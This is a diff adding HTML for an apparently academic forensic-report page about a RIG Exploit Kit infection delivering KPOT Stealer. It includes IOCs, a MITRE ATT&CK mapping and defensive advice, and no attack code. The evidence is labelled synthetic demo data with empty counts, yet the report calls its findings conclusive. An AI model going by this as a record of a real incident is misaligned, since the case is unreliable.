+                                <div><strong>Status:</strong> <span class="badge badge-success">COMPLETED</span></div>
+                                <div><strong>Classification:</strong> TLP:CLEAR / ACADEMIC</div>
+                            </div>
+                        </div>
+
+                        <hr class="report-divider">
+
+                        <!-- Title -->
+                        <div class="report-title-section">
+                            <h1>Network Forensic Analysis of a RIG Exploit Kit Drive-by Infection Delivering KPOT Stealer</h1>
+                            <p class="report-exec-summary">
+                                <strong>Executive Summary:</strong> Forensic examination of network traffic evidence revealed an automated drive-by compromise cycle. Workstation <code>10.0.76.109</code> (hostname <code>BANGKOK-8AC2-PC</code>) was redirected to RIG Exploit Kit delivery infrastructure at <code>37.46.135.170</code>. Following client-side exploitation, an executable payload identified as KPOT Stealer was delivered. The compromised host initiated DNS resolution for <code>fghjkmgru34.site</code> (resolved to <code>8.209.83.76</code>) and commenced credential exfiltration via periodic HTTP POST beacons targeting <code>/gate.php</code>.
+                            </p>
+                        </div>
+
+                        <!-- Forensic Artifact Details -->
+                        <div class="report-section">
+                            <h3>1. Evidence Identification & Integrity</h3>
+                            <table class="report-table">
+                                <tbody>
+                                    <tr>
+                                        <td><strong>Evidence File:</strong></td>
+                                        <td id="rep-filename">Synthetic_RIG_KPOT_Case_Study.pcap</td>
+                                        <td><strong>Analysis Mode:</strong></td>
+                                        <td><span id="rep-mode">DEMO DATA</span></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>SHA-256 Hash:</strong></td>
+                                        <td colspan="3" class="font-mono" id="rep-filehash">e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Total Packets:</strong></td>
+                                        <td id="rep-packets">0</td>
+                                        <td><strong>Suspicious Events:</strong></td>
+                                        <td id="rep-suspicious">0</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <p class="text-sm text-muted mt-1"><em>Note on Integrity: Cryptographic hashing verifies that forensic artifacts have not been modified post-acquisition, but does not independently prove original network authenticity.</em></p>
+                        </div>
+
+                        <!-- Corroborated IOCs Table -->
+                        <div class="report-section">
+                            <h3>2. Corroborated Indicators of Compromise (IOCs)</h3>
+                            <table class="report-table" id="rep-ioc-table">
+                                <thead>
+                                    <tr>
+                                        <th>Indicator</th>
+                                        <th>Type</th>
+                                        <th>Role in Incident</th>
+                                        <th>Severity</th>
+                                        <th>Observed Matches</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="rep-ioc-tbody">
+                                    <!-- Populated dynamically -->
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <!-- Incident Timeline Summary -->
+                        <div class="report-section">
+                            <h3>3. Reconstruction of Attack Timeline</h3>
+                            <div id="rep-timeline-summary" class="rep-timeline-list">
+                                <!-- Populated dynamically -->
+                            </div>
+                        </div>
+
+                        <!-- MITRE ATT&CK Mapping -->
+                        <div class="report-section">
+                            <h3>4. MITRE ATT&CK Matrix Alignment</h3>
+                            <table class="report-table">
+                                <thead>
+                                    <tr>
+                                        <th>Tactic</th>
+                                        <th>Technique</th>
+                                        <th>Observed Evidence</th>
+                                        <th>Confidence</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>Initial Access</td>
+                                        <td>T1189 Drive-by Compromise</td>
+                                        <td>Malvertising / Iframe redirect to 37.46.135.170</td>
+                                        <td>High</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Execution</td>
+                                        <td>T1203 Exploitation for Client Execution</td>
+                                        <td>Client memory exploitation via RIG landing script</td>
+                                        <td>Medium Lead</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Command & Control</td>
+                                        <td>T1071.001 Web Protocols</td>
+                                        <td>Outbound HTTP POST to fghjkmgru34.site / 8.209.83.76</td>
+                                        <td>Confirmed</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Exfiltration</td>
+                                        <td>T1041 Exfiltration Over C2 Channel</td>
+                                        <td>HTTP POST payloads targeting /gate.php</td>
+                                        <td>Confirmed</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <!-- Incident Response & Hardening Recommendations -->
+                        <div class="report-section">
+                            <h3>5. Incident Response & Containment Recommendations</h3>
+                            <ul class="report-bullets">
+                                <li><strong>Perimeter Defense:</strong> Block outbound traffic to <code>37.46.135.170</code> and <code>8.209.83.76</code>. Implement sinkholing for <code>fghjkmgru34.site</code>.</li>
+                                <li><strong>Endpoint Remediation:</strong> Isolate workstation <code>10.0.76.109</code> (BANGKOK-8AC2-PC). Image workstation memory and storage for offline root-cause confirmation.</li>
+                                <li><strong>Credential Revocation:</strong> Assume browser-stored passwords and active session tokens are compromised; mandate enterprise-wide credential resets and verify MFA.</li>
+                            </ul>
+                        </div>
+
+                        <!-- Investigation Limitations -->
+                        <div class="report-section">
+                            <h3>6. Investigation Scope & Forensic Limitations</h3>
+                            <p class="report-text">
+                                Network packet captures provide authoritative visibility into unencrypted wire transactions (DNS queries, plain HTTP headers, and initial payload downloads). However, encrypted TLS sessions, endpoint internal process trees, and exact exploit memory artifacts cannot be definitively confirmed from network captures alone without accompanying endpoint memory/disk forensic images.
+                            </p>
+                        </div>
+
+                        <!-- Conclusion -->
+                        <div class="report-section">
+                            <h3>7. Conclusion & Attestation</h3>
+                            <p class="report-text">
+                                The forensic evidence conclusively correlates with a full RIG Exploit Kit infection chain culminating in KPOT Stealer data theft. This investigation report satisfies the academic evaluation criteria for B.Tech Cyber Security Theory CA-2.
+                            </p>
+                            <div class="report-signatures">
+                                <div>
+                                    <div class="sig-line"></div>
+                                    <p>Investigating Forensic Team: Group G66</p>
+                                </div>
+                                <div class="text-right">
+                                    <div class="sig-line"></div>
+                                    <p>Academic Evaluator / SOC Lead</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+            </div>
+        </main>
+    </div>
+
+    <!-- Packet Detail Modal -->
+    <div class="modal" id="packet-detail-modal">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <div>
+                        <h3 id="modal-pkt-title">Packet #0 Deep Inspection</h3>
+                        <span class="badge" id="modal-pkt-badge">TCP</span>
+                    </div>
+                    <button class="modal-close" onclick="closeModal()">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <div class="modal-meta-grid" id="modal-pkt-meta">
+                        <!-- Populated by JS -->
+                    </div>
+
+                    <h4 class="mt-3 mb-1"><i class="fa-solid fa-terminal"></i> Payload & Decoded Stream</h4>
+                    <div class="hex-viewer" id="modal-pkt-payload">
+                        <!-- Raw payload snippet -->
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" onclick="closeModal()">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Notifications -->
+    <div class="toast-container" id="toast-container"></div>
+
+    <script src="/static/app.js"></script>
+</body>
+</html>
